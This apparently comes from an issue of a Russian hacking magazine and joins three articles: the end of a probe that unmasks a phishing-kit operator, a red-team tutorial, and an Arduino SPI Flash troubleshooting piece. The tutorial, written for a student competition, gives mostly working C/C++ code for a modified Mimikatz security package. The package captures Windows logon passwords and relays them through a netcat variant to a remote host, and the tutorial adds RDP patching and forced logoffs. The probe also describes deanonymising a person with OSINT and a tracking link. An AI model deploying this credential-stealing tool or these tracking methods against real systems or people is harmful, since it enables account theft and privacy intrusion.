  В январе 2024 года мы собрали полный отчет, где подробно расписали
все наши находки, и поделились им с несколькими правоохранительными
органами.
  С самого начала проекта мы старались сосредоточиться на общей кар‐
тине. Чтобы зачистить поле от смишинга, фишинга и других разводов, надо
подключать всех:  банки, мобильных операторов,  IT-гигантов и полицию.
Именно поэтому мы решили связаться с NRK, Норвежской телерадиоком‐
панией. Вдруг там кого‑то заинтересует, что мы тут накопали?
  Мы поделились всеми нашими находками на тот момент и продолжили
исследование. Но главный вопрос остался без ответа. Кто такой Даркула?


ПО ТУ СТОРОНУ

Darcula держался в тени. Пока другие пользователи хвастались своей рос‐
кошной жизнью в паблике Telegram, он в основном постил скучные техничес‐
кие новости про Magic Cat и не оставлял нам почти никаких зацепок. Мы даже
не были уверены, кто или что такое Darcula — человек или целая группа. Мы
продолжали копаться, просеивая все доступные данные о софтверной эко‐
системе.
   Попасть в тупик в расследовании — классика жанра. Но вот удача: мы нат‐
кнулись на IP-адрес, который, похоже, был связан с административными фун‐
кциями. Не исключено, что этот айпишник мог привести к тем, кто стоит
за софтом Magic Cat.





IP принадлежал виртуальной машине в облаке Alibaba, вероятно, какому‑то
VPN. Сам по себе этот факт мало что означал. Это могло быть самодельное
творение Darcula или общедоступный  сервис, на котором сидят  сотни
или даже тысячи юзеров. В любом случае другой зацепки у нас не было.
  Мы решили выяснить, для чего использовался этот IP-адрес в прошлом.
У нас есть собственный сервис Passive DNS , который ведет что‑то вроде
исторического архива, где хранится информация о том, какие IP-адреса
с какими доменами были связаны. Благодаря этим записям мы обнаружили,
что чуть больше года назад, в декабре 2022-го, этот IP был привязан к кон‐
кретному домену. Копнув глубже исторические данные DNS, мы выяснили, что
домен был связан с пользователем GitHub.





IP-адреса часто меняют владельцев. Если виртуальная машина в Alibaba
Cloud удалялась, ее IP мог легко перейти к другому клиенту. Но нас это не
остановило — вдруг повезет? К тому же репозитории на GitHub содержали
софт, созданный с использованием тех же фреймворков, что и Magic Cat.
Это намекает на потенциальную связь.
  В истории коммитов мы нашли  почту на Gmail. Это  стало зацепкой
для дальнейшего поиска информации, которая либо опровергнет, либо под‐
твердит теорию о том, что это действительно Даркула.
  В ходе исследования мы использовали бесплатный вариант сервиса
OSINT Industries . Он помогает узнать, какие аккаунты привязаны к определен‐
ному адресу электронной почты или номеру телефона. Также он показывает
всю доступную публичную информацию об аккаунте.
   Представь, что ты начинаешь сбрасывать пароль на сайте, а сайт тебе
говорит: введи номер телефона, заканчивающийся на XX, чтобы мы выслали
код. Если ты проделаешь это на куче сайтов, сможешь выяснить, на каких
из них использовалась почта, и даже можешь частично расшифровать номер
телефона. В OSINT Industries уже автоматизировали этот процесс и применя‐
ют в промышленных масштабах.
   Пробив аккаунт на Gmail через OSINT Industries, мы нашли кое‑что инте‐
ресное. Телега Даркулы была привязана к американскому номеру, который
мы считали одноразовым. Номер заканчивался на 89. И тут выясняется, что
этот же Gmail связан с Apple ID, где номер тоже кончается на 89.





Была ли это просто случайность? Самый быстрый способ развеять или,
наоборот, укрепить подозрения, что Даркула и наш пользователь GitHub —
одно и то же лицо, — это выяснить, не продолжает ли наш герой исполь‐
зовать тот же сервер для VPN. Мы решили отправить на связанный Gmail-
адрес письмо со ссылкой‑заманухой. Если кто‑то кликнет, у нас на руках
будет IP-адрес.
  И на ссылку кликнули!





Это подтвердило, что email по‑прежнему активен, а кто‑то, имеющий доступ
к этому аккаунту, кликнул на ссылку. IP-адрес совпал с тем, который мы
видели в Magic Cat. Все больше улик указывает на связь с Даркулой.


ЕЩЕ ГЛУБЖЕ В КРОЛИЧЬЮ НОРУ

Поиск от OSINT Industries в числе прочего выдал нам частичный китайский
номер телефона, связанный с аккаунтом Gmail.
  Для получения нового китайского телефонного номера требуется удос‐
товерение личности. Это значит, что если мы сумеем раздобыть полный
китайский номер Даркулы, то у нас появится крутая зацепка, которая выведет
нас на его настоящую личность.
  С доменом, который мы нашли ранее, связан еще один адрес электрон‐
ной почты. На этот раз — аккаунт QQ, популярного китайского мессенджера
и почтового сервиса. Мы сопоставили всю информацию об аккаунте на Gmail
с данными о QQ и раскрыли почти весь телефонный номер, за исключением
последних трех цифр.
    Занятно, что нет единого стандарта, какие именно цифры скрывать, когда
сайт показывает лишь часть номера при восстановлении аккаунта. Если раз‐
ные сайты маскируют разные цифры, ты можешь наложить их результаты друг
на друга и узнать значительную часть номера.
   Три пропущенных цифры оставили нам 1000 возможных телефонных
номеров. Мы хотели искать их через OSINT Industries, но это могло бы влететь
в копеечку. Вместо этого мы решили изучить базы данных утечек информации
на все возможные номера, а уже найденные результаты прогнать через
OSINT Industries.





Мы подумали вот о чем: не у всех телефонных номеров есть след в сети,
и шансы больше у тех, что всплывали в утечках публичных баз данных.
  Наш подход, похоже, окупился: мы нашли номер телефона, связанный
с аккаунтом в Instagram — с таким же именем пользователя, как в Gmail, и той
же аватаркой.





Теперь, когда у нас есть кандидат на номер телефона, мы решили покопаться
в исторических записях WHOIS (это такие публичные регистраторы доменов)
для сайтов, которые могли быть зарегистрированы с этим номером. И снова
успех: в записи было полное имя, номер телефона и город.





Мы уже встречали это имя в Telegram. Даркула заваливал сеть ворохом вор‐
довских файлов со всякими инструкциями по установке и использованию
Magic Cat. В метаданных документов значилось то же имя.





ИСТОРИЯ ПРОДОЛЖАЕТСЯ

Когда мы начали копаться в этом фишинг‑ките, нас подстегнуло то, что
информации о современных фишинговых кампаниях почти не было.
  Мы решили выяснить, кто стоит за этой схемой и как она вообще работает.
В идеале хотелось раскопать достаточно информации, чтобы выкатить статью
и рассказать обо всех тонкостях.
   Наше исследование выявило сотни тысяч жертв, тысячи лицензий, куп‐
ленных для использования Magic Cat, и развитую экосистему, которая поз‐
воляет неправомерно использовать известные названия организаций со все‐
го мира.
  На этом этапе мы почувствовали, что наша роль в этой истории подходит
к концу. Журналисты норвежского телеканала NRK смогли взять наши находки
и благодаря своему расследованию подсветить новые факты. Они открыли
дверь для дискуссий о том, что мы можем сделать, чтобы пресечь преступле‐
ния такого рода.


Работодатели Даркулы
Репортеры норвежского медиаресурса NRK в рамках собственного рассле‐
дования обратились к независимому исследователю Ксавье Хуану, специали‐
зирующемуся на КНР.
  По его данным, найденный номер телефона зарегистрирован на Юйчэна
С., 24-летнего жителя китайской провинции Хэнань. Сопоставив всё, авторы
расследования NRK уверенно утверждают: именно Юйчэн стоит за киберкри‐
минальной личностью Darcula. В их распоряжении — даже его фото с удос‐
товерения личности.





В NRK решили связаться с Даркулой напрямую и отправили сообщение,
обратившись к нему по настоящему имени. Ответ пришел спустя несколько
дней — от человека, представившегося как Лао Лю:
 — Юйчэн работал у нас, но уволился неделю назад.
  Он отказался называть компанию или ее юридический адрес, ссылаясь
на конфиденциальность. Но NRK настаивает:
 — Мы пишем о Magic Cat и хотим поговорить с теми, кто его создавал.
 — Нас много, и я один из них, — отвечает Лю. — Да, Юйчэн тоже участво‐
вал. Он был самым успешным продавцом. Можно сказать, один из основате‐
лей. Хотя официально он просто получал зарплату.
  На вопрос, является ли Юйчэн автором программы, Лю уклончиво отве‐
чает: один из разработчиков. И добавляет:
 — Мы не хотим его терять.
   Когда NRK  указывает  на  то,  что  Magic  Cat  активно  используется
для фишинга, Лю настаивает:
 — Мы просто продаем софт, который создает сайты. Мы никого не под‐
талкиваем к мошенничеству. Наша сфера — кибербезопасность и борьба
с фродом.
 — Но Darcula в Telegram помогает мошенникам, использующим Magic Cat.
У нас есть доказательства.
 — Мы не знаем, кто именно использует наш продукт, — отрезает он. —
Но да, я знаю, что его применяют в схемах. Мы всё закроем.
   Журналисты NRK подчеркивают, что на момент публикации Magic Cat
не только не был закрыт, но вышла новая, более продвинутая версия, которая
позволяет еще проще обманывать людей и воровать их деньги.
КОДИНГ





Сегодня мы напишем  утилиту,  которая
перехватывает   в   реальном   времени
и отправляет на удаленный хост учетные
данные  пользователей,  позволяет  запус‐
                                                                                                                      Vlhll
                                                                                       @Stack_Canary_Foundкать несколько сессий RDP и разрывать
конкурирующие подключения. Для этого мы
изменим исходный код Mimikatz.


В 2024 году проходила всероссийская студенческая кибербитва, в которой
мне посчастливилось участвовать в составе команды Team8.
   Тогда нам удалось одержать победу, и сейчас я хочу рассказать об одной
из составляющих подготовки к соревнованиям. А именно о создании offensive
tools — утилит, упрощающих жизнь участникам Red Team.
   Немного поковыряв Standoff, я взял на заметку несколько моментов,
которые постарался учесть в своей программе:
 • частое использование утилит, связанных с добыванием учетных данных
   в системе (например, Mimikatz);
 • периодические  конфликты  между  участниками за общие  ресурсы  (в
   основном RDP-доступ к удаленному  хосту), поскольку инфраструктура
   одна на всех.

Программа писалась за десять дней до соревнований, поэтому, возможно,
некоторые решения покажутся тебе не совсем элегантными. Но в условиях
цейтнота получилось то, что получилось.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



LISTENYOURHEART

Основная функция этой утилиты — перехват и ретрансляция на удаленный
хост учетных данных пользователей в реальном времени, а также организа‐
ция противодействия (не выходящего за рамки приличия) пользователям
из других команд Red Team.
   Поскольку разработка программы имела жесткое ограничение по вре‐
мени, целесообразно было обратиться к готовым опенсорсным решениям
в этой области, что я и сделал.





                   Компоненты программы ListenYourHeart

Программа состоит из пяти модулей:
 • LyH.cpp — основной модуль, выполняющий подготовительные операции;
 • mimilib.dll — модифицированный  secuirty support provider из утилиты
   Mimikatz, перехватывающий учетные данные пользователя;
 • mefcat.exe — модифицированный netcat, передающий учетные данные
   пользователя на удаленный хост;
 • PatchTermSrv.exe — скрипт, который патчит termsrv.dll , чтобы появи‐
   лась возможность создавать множество сеансов RDP на одной и той же
   машине;
 • KoH.bat — скрипт, автоматически отключающий активные сеансы RDP.


ИНИЦИАЛИЗАЦИЯ

Чтобы начать работу, программа должна быть обеспечена необходимым
окружением. Этим занимается класс dropp3r из модуля LyH.cpp. Dropp3r
создает папку в корне диска C: с именем temp , выгружает файлы, зашитые
в исполняемый файл программы, с использованием механизма ресурсов,
а также регистрирует Security Support Provider в системе:


class dropp3r {
public:
    dropp3r() = default;
    int createTempDirectory();
    int dropRelations();
    int loadProvider();
};


// Выгрузка необходимых инструментов и зависимостей


int dropp3r::dropRelations() {


    const std::string files[] = {
        "patchTerm.exe"s,
        "KoH.bat"s,
        "nc6.exe"s
    };


    for (int i = 1; i < 4; i++) {
        HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(i), RT_RCDATA
);
        if (!hRes) return ERR_NOT_FOUND;


        HGLOBAL hData = LoadResource(NULL, hRes);
        if (!hData) return RESOURCE_NOT_LOAD;


        void* pData = LockResource(hData);
        DWORD size = SizeofResource(NULL, hRes);


        std::string outPath = PATH + "\\"s + files[i - 1];


        std::ofstream out(outPath, std::ios::binary | std::ios::out);


        if (!out) return NO_CREATE_FILE;


        out.write(static_cast<const char*>(pData), size);
        out.close();


    }
    return 0;
}


// Выгрузка и регистрация Security Support Provider в системе


int dropp3r::loadProvider() {


    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(7), RT_RCDATA);
    if (!hRes) return ERR_NOT_FOUND;


    HGLOBAL hLoadedResource = LoadResource(NULL, hRes);
    if (!hLoadedResource) return RESOURCE_NOT_LOAD;


    void* pMim = LockResource(hLoadedResource);
    DWORD size = SizeofResource(NULL, hRes);



    LPWSTR packagePath = (LPWSTR)TEXT("c:\\windows\\system32\\
mimilib.dll");
    SECURITY_PACKAGE_OPTIONS spo = {};


    HANDLE hMimilib = CreateFileW(packagePath,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);


    DWORD wrtn = 0;
    WriteFile(hMimilib, (LPCVOID)pMim,size, &wrtn, NULL);
    CloseHandle(hMimilib);


    std::cout<<"[dropp3r] Trying to add security package . . .\n";


    SECURITY_STATUS ss = AddSecurityPackageW(packagePath, &spo);
    if (ss != SEC_E_OK) {
        if (ss == SEC_E_SECPKG_NOT_FOUND) {
            std::cout<<"[dropp3r] can't find mimilib [-]\n";
            return ERR_NOT_FOUND;
        }
        else {
            std::cout << "[dropp3r] FAILED! [-]\n";
            return ERROR;
        }
    }
    else {
        std::cout << "[dropp3r] SUCCESS! [+]\n";
    }
    return 0;


}


        WWW

                     Для более глубокого погружения в тему, связан‐
                     ную с SSP/AP, советую прочитать статью « Пос‐
                      тавщик небезопасности. Как Windows раскрывает
                       пароль пользователя ».



СОЗДАНИЕ КАНАЛА ПЕРЕДАЧИ ДАННЫХ





             Процесс передачи перехваченных учетных данных

После создания окружения необходимо организовать канал передачи дан‐
ных. В этом процессе участвуют три элемента:
 • SecuritySupportProvider , который передает данные в сыром виде;
 • mefcat (модифицированный netcat), который находится на стороне жер‐
   твы, получает напрямую от SSP креды пользователя и передает их на уда‐
   ленный хост;
 • netcat на стороне атакующего, принимающий креды от mefcat.


Сервер
Для связывания mefcat с SSP я выбрал именованные пайпы, а также Windows-
события (Windows Events). И вот почему:
 • pipe — достаточно надежный канал передачи данных. При возникновении
   ошибок их можно легко отследить и локализовать;
 • глобальные события отлично подходят для синхронизации процессов.

Для начала необходимо установить соединение с удаленным хостом —
получить сокет для взаимодействия с ним. Этим занимается класс Listen3r
из модуля LyH.cpp. Единственная его функция — создание процесса mefcat
с переданным адресом удаленной машины.


LyH.cpp
int listen3r::buildChannel(std::string IP,std::string PORT) {
    // ...
    std::string commandLine ="c:\\windows\\system32\\cmd.exe /c "s +
PATH + "nc6.exe "s + IP + " "s + PORT;
    // ...
    if (CreateProcessA(NULL,
        (LPSTR)(commandLine.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        (LPSTARTUPINFOA)(&si),
        &pi)) {
        SleepEx(5000, FALSE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else{
    // ...

Затем, после получения сокета, соединяем mefcat с mimilib.dll.


mefcat.c
// Название именованного канала, через который будут общаться SSP и
mefcat
#define PIPE_NAME L"\\\\.\\pipe\\communicate"


DWORD procCommunicate() {


    BOOL err = 0;


    // Создаем глобальное событие, указывающее нашему SSP, что
mefcat готов к работе
    hEvent = CreateEventW(NULL,TRUE,FALSE,L"Global\\active");
    if (hEvent == NULL) {
        DWORD err = GetLastError();
            // Если событие уже создано, то получаем его handle
        if (err == ERROR_ALREADY_EXISTS) {
            hEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, L"Global\\
active");


            if (hEvent == NULL) {
                printf("Cannot create|open event. exiting...\n");
                exit(-1);
            }
        }
    }
/* Cоздаем именованный канал передачи данных. Здесь mefcat выступает
в роли сервера, который создает именованный pipe и ждет подключения
от SSP */
    hpPass = CreateNamedPipeW(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX ,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE |PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        1024,
        1024,
        0,
        NULL);


    if (hpPass == INVALID_HANDLE_VALUE) {
        printf("Error creating named pipe: %d\n", GetLastError());
       return 1;
    }
      // Устанавливаем событие в сигнальное состояние (говорим SSP,
что мы готовы к работе)
    SetEvent(hEvent);


waitConnect:
    printf("Zetting for a cl13nt to c0nn3ct...\n");


      // Ожидаем подключения к нашему каналу SSP
    if (ConnectNamedPipe(hpPass, NULL) != TRUE && GetLastError() !=
ERROR_PIPE_CONNECTED) {


        printf("Error connecting to communicate channel: %d\n",
GetLastError());
        goto waitConnect;
    }


    printf("Client connected.\n");
      // После подключения ожидаем получения учетных данных от SSP
    while (1) {
        if (err)
            exit(1);


        char buf[1024] = { 0 };
        DWORD bytesRead;
        DWORD bytesWritten;


            // Получаем данные от SSP
        if (ReadFile(hpPass, buf, sizeof(buf), &bytesRead, NULL)) {


            printf("sending the leaked info to the host. . .\n");



/* Отправляем учетные данные на удаленный хост netfd — дескриптор
сокета, созданный mefcat при подключении к удаленному хосту */


            if (send(netfd, buf, bytesRead, 0) == SOCKET_ERROR) {


                        // Если удаленный хост закрыл соединение, то
выходим
                if (WSAGetLastError() == WSAECONNRESET ||
WSAGetLastError() == WSAECONNABORTED) {
                    printf("remote host disconnected. . .\n");
                    err = 1;


                }


            }
        }


        else {
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                      // Закрываем текущее соединение,
переподключаем listener
                DisconnectNamedPipe(hpPass);
                hpPass = NULL;
                printf("PIPE HAS BROKEN goto up :(\n");
                goto waitConnect;
            }


        }


    }


    return 0;
}





                                     Продолжение статьи                    →
                   ← НАЧАЛО СТАТЬИКОДИНГ
     СЛУШАЙ СЕРДЦЕ
         ПИШЕМ ТУЛЗУ ДЛЯ ПЕРЕХВАТА
                              УЧЕТОК




При разрыве соединения удаленным хостом программа завершается. Одна‐
ко событие необходимо поставить в несигнальное состояние, чтобы про‐
информировать SSP о неработоспособности mefcat и соединения в целом.
Для этого зарегистрируем callback-функцию, выполняющуюся перед завер‐
шением программы:


mefcat.c
BOOL WINAPI reset(DWORD event) {
    switch (event) {


    // Событие закрытия пользователем программы
    case CTRL_CLOSE_EVENT:
        lastSignal();
        return TRUE;
    default:
        return FALSE;
    }
}


void lastSignal() {
    if (hEvent != NULL) {
          // Устанавливаем событие в несигнальное состояние
        if (!ResetEvent(hEvent)) {
            DWORD err = GetLastError();
            printf("error while setting event: %d", err);
        }
    }
}


int main(int argc, char** argv)
{
    // Установка callback-функции при закрытии приложения
    SetConsoleCtrlHandler((PHANDLER_ROUTINE)reset, TRUE);
    // ...
}


Клиент
Отлично, серверную часть соединения мы написали, переходим к клиентской.
Клиентская часть реализована внутри SSP — в виде библиотеки mimilib.
dll.
  При аутентификации пользователя из каждого зарегистрированного SSP
вызывается функция SpAcceptCredentials, в которую передаются его учет‐
ные данные. В исходном коде Mimikatz  внутри SpAcceptCredentials()
вызываются функции, которые логируют пойманные учетные данные в файл:


kssp.c
NTSTATUS NTAPI kssp_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType
, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED
PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials
)
{
    FILE *kssp_logfile;


#pragma warning(push)
#pragma warning(disable:4996)


    if(kssp_logfile = _wfopen(*kssp_logfile, L"a"))
#pragma warning(pop)
    {
        // Функции перехвата учетных данных
        klog(kssp_logfile, L"%wZ\\%wZ (%wZ)\t",&PrimaryCredentials->
DomainName, &PrimaryCredentials->DownlevelName, AccountName);
        klog_password(kssp_logfile, &PrimaryCredentials->Password);
        klog(kssp_logfile, L"\n");
        fclose(kssp_logfile);
    }


    return STATUS_SUCCESS;
}

Увы, но функции работают со структурой FILE , нам же нужно писать в handle
именованного pipe. Напишем свою функцию klog_pipe, которая как раз
и будет играть роль клиента.
  Для начала необходимо получить handle события, а затем проверить его
состояние и определить, готов ли mefcat к работе.


utils.c
int klog_pipe(PUNICODE_STRING Domain, PUNICODE_STRING downLevel,
PUNICODE_STRING AccountName, PUNICODE_STRING Password) {


    DWORD bytesWritten = 0;
    BOOL active = FALSE;


  // Если событие еще не создано, создаем его и ждем, пока состояние
события изменит mefcat
    HANDLE hEvent = CreateEventW(NULL,TRUE,FALSE,L"Global\\active");


    if (hEvent == NULL) {
        DWORD err = GetLastError();
        if (err == ERROR_ALREADY_EXISTS) {
            // Получаем хендл события
            hEvent = OpenEventW(EVENT_ALL_ACCESS,FALSE, L"Global\\
active");
            if (hEvent == 0)
                return -1;
        }
    }


  // WaitForSingleObject с нулевым временем ожидания немедленно
возвращает состояние события
    DWORD chkEvent = WaitForSingleObject(hEvent, 0);
    // Событие в сигнальном состоянии?
    if (chkEvent == WAIT_OBJECT_0)
    {
    . . .
    else{
      // Если нет, то просто закрываем хендл события
        CloseHandle(hEvent);
        return 0;
}

И если mefcat готов к работе, реализуем основную логику клиентской части:


/* transactToPipe вынесена в глобальную область видимости текущего
файла. Это нужно для того, чтобы при каждом новом вызове функции
SpAcceptCredentials наша сессия с mefcat сохранялась
*/
static HANDLE transactToPipe = INVALID_HANDLE_VALUE;


if (chkEvent == WAIT_OBJECT_0)
    {
        // Если у нас нет валидного handle именованного канала,
получаем его


        if (transactToPipe == INVALID_HANDLE_VALUE) {
            transactToPipe = CreateFileW(
                L"\\\\.\\pipe\\communicate",
                GENERIC_WRITE | GENERIC_READ,
                0,
                NULL,
                OPEN_EXISTING,
                0,
                NULL);
        }


        if (transactToPipe == INVALID_HANDLE_VALUE ) {
            return -1;
        }


        // Выделяем память под креды
        wchar_t* data = calloc(sizeof(wchar_t) * 511, 1);


        // Копируем креды
        int ret = swprintf(data, 511, L"%s|%s\n",
            // Domain->Buffer,
            // Мне достаточно было логина и пароля
            // downLevel->Buffer,
            AccountName->Buffer,
            Password->Buffer
        );
      DWORD len = (DWORD)(wcslen(data)) * sizeof(wchar_t);


        // Отправляем креды в именованный канал
        BOOL success = WriteFile(
            transactToPipe,
            data,
            len,
            &bytesWritten,
            NULL
        );


/* Здесь выполняется проверка на работоспособность mefcat. В случае
если он сломался, закрываем handle пайпa. При последующем вызове
функции SpAcceptCredentials и при условии, что событие в сигнальном
состоянии, получим его заново */


        if (!success) {
            DWORD err = GetLastError();
            // Если pipe сломался (закрыт mefcat)
            if (err == ERROR_NO_DATA || err ==
ERROR_PIPE_NOT_CONNECTED ||
                err == ERROR_BROKEN_PIPE)
            {
                // Закрываем хендл текущего соединения
                CloseHandle(transactToPipe);
                // Говорим функции, что надо создать новый pipe
handle
                transactToPipe = INVALID_HANDLE_VALUE;
            }
        }


         free(data);
    }
        // Предотвращаем утечку хендлов события
        CloseHandle(hEvent);
         return 0;
}

Теперь      добавляем     нашу      функцию     во      внутренности
kssp_SpAcceptCredentials :


kssp.c
NTSTATUS NTAPI kssp_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType
, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED
PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials
)
{
    FILE *kssp_logfile;


#pragma warning(push)
#pragma warning(disable:4996)


    // Наша функция
    klog_pipe(&PrimaryCredentials->DomainName,&PrimaryCredentials->
DownlevelName, AccountName, &PrimaryCredentials->Password);
    if(kssp_logfile = _wfopen(*kssp_logfile, L"a"))
#pragma warning(pop)
    . . .

Готово, теперь наша программа умеет «слушать» учетные данные в реальном
времени и «нашептывать» их нам.


Противодействие
             INFO

                      Код в этой части статьи не претендует на красоту
                     решения проблемы, тем не менее для полного
                        понимания хода создания offensive tool я все же
                     решил рассказать об этом.


Когда я писал этот код, основной целью было поиграть с оппонентами
в «царя горы», зная, что заведомо выиграю я. Мне не хотелось изучать внут‐
рянку протокола RDP, вместо этого я решил использовать свой скромный
опыт.
  Я знал, что, если пропатчить termsrv.dll — библиотеку, отвечающую
за работу с RDP-соединениями, можно получить multi-session RDP: в этом
случае несколько пользователей смогут работать на одной и той же машине
через RDP одновременно и у них не будет выскакивать окошко, информи‐
рующее о том, что на машине уже кто‑то есть.
   Существует также утилита qwinsta.exe, которая предоставляет информа‐
цию об открытых сессиях RDP, и утилита logoff.exe, завершающая заданный
сеанс RDP.
   Теперь формируем  последовательность  действий,  исходя из  данных
выше:
 1. Создаем пользователя, добавляем в группу «Администраторы».
 2. Загружаем на компьютер LyH.exe .
 3. Запускаем LyH.exe, указываем параметры:


   --patch, --koh [username]

При этом заходящие пользователи будут успевать лишь ввести свой пароль
(который перехватит LyH и передаст нам), а затем вместо рабочего стола
у них сразу же появится надпись logout...


             INFO

                     На практике пользователи сразу же пишут орга‐
                         низаторам или админам, мол, тачка упала, админ,
                        переподними. Админ зачастую пытается сначала
                            зайти на наш хост, и его учетные данные тоже
                           улетают к нам.


Теперь переходим к технической части вопроса.
  В программе за все эти функции отвечает класс kik3r из модуля LyH.cpp.
Он  просто  запускает  два  скрипта  в  виде  отдельных  процессов —
patchTermSrv.exe и KoH.bat.


LyH.h
class kik3r {
public:


    kik3r() = default;
    int patchMultiRDP();
    // KoH.bat стартует отсюда
    int kick_off();
};


LyH.cpр
int kik3r::patchMultiRDP() {


    std::cout << "[kik3r] trying to patch termsrv.dll for allowing
multiple rdp client...\n";


    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(STARTUPINFO));
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    if (CreateProcessA(NULL,
        (LPSTR)( (PATH + "\\patchTerm.exe"s ).c_str()),
    . . .

Первый из них — powershell-script с GitHub, завернутый в exe-формат. Он пат‐
чит termSrv.dll. Второй — скрипт, стыренный c сайта сисадминов и адап‐
тированный под мои нужды.
   Скрипт ежесекундно запускает процессы qwinsta.exe и logoff.exe.
Qwinsta говорит logoff.exe, есть ли в системе кто‑то новенький, и, если
есть, logoff.exe кикает его. Причем «царя горы» он не трогает.
   Исходный код программы и все ее составляющие можно посмотреть
на моем GitHub .


ВЫВОДЫ

В итоге у нас получился вот такой вот «Франкенштейн», состоящий из неболь‐
шого множества опенсорсных допиленных проектов.
  В статье я попытался рассмотреть подготовку к соревнованиям под дру‐
гим углом и показать, что для решения практических задач можно собрать
что‑то свое. При должном подходе к проектированию и созданию подобного
инструментария можно обскакать всех соперников. Как говорил великий рус‐
ский полководец Александр Васильевич Суворов, «Тяжело в учении — легко
в бою». Успехов!
GEEK





В  сегодняшней  статье мы  разберемся,
почему микросхемы Macronix отказываются
работать с самодельным программатором
на базе Arduino UNO и при чем здесь длина
проводов. А заодно разработаем методику         Игорьr0bur@mail.ruОрещенков
моделирования таких схем и автоматизиру‐
ем тестирование чтения‑записи.


На рынке доступно множество микросхем памяти SPI Flash 25-й серии,
которые совместимы между собой по принципу работы и электрическим
параметрам. Но, как оказалось, не все они одинаково хорошо работают с са‐
модельным программатором, собранным на основе клона Arduino UNO .
  В этой статье мы разберемся, почему такой программатор отказывается
работать с чипом MX25L6406E производства Macronix. По ходу дела раз‐
работаем и обоснуем метод оценки качества работы программатора, про‐
ведем  множество  экспериментов,  выдвинем и  опровергнем  несколько
гипотез, построим теоретические модели соединительных проводов.
  Еще мы выполним имитацию их работы в программе Quite Universal Circuit
Simulator и в конце концов найдем и устраним «слабое звено». Ты увидишь,
что длина соединительных проводов имеет значение, но отнюдь не реша‐
ющее.


ОТ ПОЛНОГО НЕПОНИМАНИЯ К НАЧАЛУ ДИАЛОГА

В предыдущей статье « UNO-программатор для SPI Flash. Прошиваем мар‐
шрутизатор подручными средствами » я рассказал о том, как собрал прог‐
рамматор, записав скетч frser-duino в клон Arduino UNO, и успешно применил
его для записи дампа прошивки маршрутизатора в микросхему Winbond
25Q128FVSG с помощью утилиты flashrom. К сожалению, маршрутизатор
с новой прошивкой не завелся, и возникла мысль записать прошивку в мик‐
росхему Macronix MX25L6406E, объем памяти которой в точности соответс‐
твовал размеру файла с дампом. В спецификации на этот чип указано, что он
работает на напряжениях от 2,7 до 3,6 В и все восемь его контактов имеют те
же назначения, что и у предыдущего «пациента».


        WWW

                         Спецификация       микросхемы       Macronix
                     MX25L6406E доступна на сайте производителя.


Я не испытывал тревоги: ну что тут может пойти не так? Разве что емкость
микросхемы составляет не 16 Мбайт, а только 8 Мбайт, но это и к лучшему —
процесс займет меньше времени. О, как же я ошибался!
  Мне так понравилось пользоваться «картриджем», изготовленным из мик‐
росхемы SPI Flash, что изделие MX25L6406E я тоже поместил на переходнике
SOP8 — DIP8 с контактами и установил на панельку DIP8 платы программа‐
тора с резистивными делителями для согласования уровней сигналов. Конс‐
трукцию платы тебе напомнит этот рисунок.





  Согласующая плата для подключения трехвольтовой микросхемы SPI
  Flash к UNO-программатору

Не ожидая никакого подвоха, я набрал команду, чтобы узнать идентификатор
микросхемы в контексте UNO-программатора:


flashrom -p serprog:dev=/dev/ttyUSB0:115200

Но вместо ожидаемых сведений на экране появилось сообщение об ошибке:


No EEPROM/flash device found

Что такое? Программатор не видит микросхему? Наверное, контакты окис‐
лились. Отключил программатор, достал картридж, протер его ножки, уста‐
новил обратно, повторил команду. Опять не видит! Проверил соединительные
провода и не обнаружил ошибок коммутации. Но программатор продолжал
упорствовать: никакой микросхемы не подключено. И спорить с ним было
бесполезно.
  Я перечитал спецификацию MX25L6406E и не нашел ничего нового
для себя. Результаты поиска в интернете тоже не дали готового решения. Те,
у кого возникла такая же проблема, в основном сетовали на большое
количество  поддельных чипов и  отказывались  от дальнейших попыток.
Но встретилось несколько упоминаний о том, что иногда программирование
проходит с большей стабильностью при пониженном напряжении. Это уже
кое‑что!


Почему резистивный делитель не подходит для питания
Ты можешь  спросить: а почему бы не понизить  напряжение питания
с помощью резистивного делителя так, как мы делали для сигнальных линий?
Но это плохая идея, и вот почему. Во‑первых, на параметры резистивного
делителя  большое  влияние  оказывает  сопротивление  входа  нагрузки,
которое в нашем случае не так велико.
   Во‑вторых, ток питания микросхемы в режиме записи VCC Program Current
составляет, если верить спецификации, 20 мА, что на много порядков пре‐
вышает ток сигналов. Это не позволяет использовать высокоомные резис‐
торы в плечах делителя — они просто не обеспечат прохождения необ‐
ходимого тока.
  А использование низкоомных приведет к значительному току через резис‐
тивный делитель на общую шину, что может вызвать перегрузку источника.
Обычно для понижения напряжения питания используют преобразователи
DC/DC на требуемое значение.



Немного понизить напряжение питания проще  всего последовательным
включением на линии VCC диода в прямом направлении. Я подключил
диод 1N4148, и напряжение с 3,3 В упало до 2,9 В. При этом оно все
еще находится в допустимом диапазоне, который указан в спецификации.
  В ответ на повторный ввод команды я увидел такие строки:




  ...


